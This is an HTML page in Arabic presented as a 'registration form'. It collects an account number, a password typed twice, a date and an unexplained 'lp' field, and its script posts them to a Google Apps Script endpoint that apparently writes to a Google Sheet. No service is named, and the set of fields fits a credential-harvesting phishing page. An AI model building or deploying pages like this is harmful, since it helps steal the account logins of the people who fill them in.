
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نموذج تسجيل</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        form {
            background-color: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 400px;
        }
        input, button {
            width: 100%;
            margin-top: 10px;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #ccc;
        }
        button {
            background-color: #4CAF50;
            color: white;
            font-weight: bold;
            border: none;
        }
    </style>
</head>
<body>
    <form name="submit-to-google-sheet">
        <h2 style="text-align:center;">نموذج تسجيل</h2>
        <input name="رقم الحساب" type="text" placeholder="رقم الحساب" required>
        <input name="كلمة المرور" type="password" placeholder="كلمة المرور" required>
        <input name="إعادة كلمة المرور" type="password" placeholder="إعادة كلمة المرور" required>
        <input name="التاريخ" type="date" required>
        <input name="lp" type="text" placeholder="lp">
        <button type="submit">إرسال</button>
        <p id="msg" style="text-align:center; color: green;"></p>
    </form>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbzzW0ByHHztmG90GUY8wKMcW4bMK1KUnSOOOpvZhhgB_eDFShAyJjBPtq16P03PQa4_/exec';
        const form = document.forms['submit-to-google-sheet'];
        const msg = document.getElementById('msg');

        form.addEventListener('submit', e => {
            e.preventDefault();
            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => {
                    msg.innerHTML = "تم إرسال البيانات بنجاح";
                    setTimeout(() => { msg.innerHTML = ""; }, 5000);
                    form.reset();
                })
                .catch(error => {
                    msg.innerHTML = "حدث خطأ أثناء الإرسال";
                });
        });
    </script>
</body>
</html>
